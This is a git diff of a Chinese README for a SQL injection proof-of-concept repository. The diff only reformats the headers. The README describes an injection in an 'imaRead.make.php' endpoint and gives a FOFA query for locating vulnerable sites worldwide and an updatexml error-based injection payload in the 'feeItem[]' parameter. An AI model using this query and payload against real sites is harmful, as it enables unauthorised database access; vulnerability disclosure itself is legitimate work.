@@ -11,17 +11,15 @@
 ---
 
 ## 🔍 漏洞详情与原理
-
 ### 1. 漏洞概述
 **系统的 `imaRead.make.php` 接口存在高危 SQL 注入漏洞。
 
 ### 2. 资产测绘 (FOFA)
-
 可通过以下 FOFA 语句在全球资产中搜索受影响的目标网址：
     
     body="不要着急，点此"
    
-3. 漏洞证明 (POC)
+### 3. 漏洞证明 (POC)
 漏洞通过 POST 请求触发，参数 feeItem[] 未经过安全过滤，直接带入数据库执行。利用 updatexml 报错注入函数，可成功爆出对 12345678 进行 MD5 散列后的报错回显：
 
         HTTP
@@ -29,7 +27,7 @@
 
         feeItem[]=1+AND+updatexml(1,concat(0x7e,md5(12345678)),1)
 
-Quick Start
+### Quick Start
 # 1. 克隆本项目仓库到本地
     git clone [https://github.com/JY-666-YINZI/Python_SQL_inj_test.git](https://github.com/JY-666-YINZI/Python_SQL_inj_test.git)
 
